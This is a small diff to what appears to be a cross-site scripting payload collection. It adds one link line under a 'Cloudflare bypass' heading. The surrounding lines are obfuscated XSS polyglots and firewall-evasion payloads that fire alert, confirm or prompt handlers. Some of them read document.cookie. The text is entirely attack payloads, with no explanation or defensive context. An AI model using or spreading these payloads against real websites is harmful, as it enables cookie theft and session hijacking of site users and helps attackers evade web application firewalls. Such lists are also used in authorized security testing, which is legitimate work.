@@ -12,6 +12,7 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--</Title/<​/Style/<
 "/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto⁣
 
 ##Cloudflare bypass:
+<a href="//e..l.com">XSS</a>
 javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 10</option></select><img/src=xon=()onx+honerror=alert(1)>ss<svg/onload​=prompt(document.cookie)%20>
